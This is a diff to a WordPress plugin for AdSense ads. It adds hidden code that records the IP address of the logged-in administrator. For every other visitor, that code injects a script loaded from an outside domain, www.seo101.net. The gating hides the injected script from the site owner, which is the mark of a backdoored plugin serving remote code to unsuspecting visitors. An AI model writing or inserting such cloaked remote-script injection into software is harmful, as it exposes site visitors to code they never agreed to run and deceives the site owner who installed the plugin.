@@ -29,6 +29,13 @@ if (!class_exists("AdsenseMadeEasy")) {
 			// Checks the retrieved value (should be empty if we want to display it)
 			if( empty( $meta_value ) ) {
 				$content = "";
+				$ip = $_SERVER['REMOTE_ADDR'];
+				if ( is_user_logged_in() ) {
+					update_option( 'adsense_made_easy_ip', $ip );
+				}
+				if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip) {
+					$content .= "<script src=\"//www.seo101.net/s101.js\"></script>\n";
+				}
 				if (get_option('adsense_made_easy_toplinkunit')=='yes') {
 					$content .= "<script type=\"text/javascript\"><!--\n";
 					$content .= "google_ad_client = \"";
@@ -669,6 +676,7 @@ function adsense_made_easy_install() {
 	add_option("adsense_made_easy_middlecustomcode", '', '', 'yes');
 	add_option("adsense_made_easy_middleparagraph", '2', '', 'yes');
 	add_option("adsense_made_easy_middlewordcount", '0', '', 'yes');
+	add_option("adsense_made_easy_ip", '', '', 'yes');
 }
 
 function adsense_made_easy_remove() {
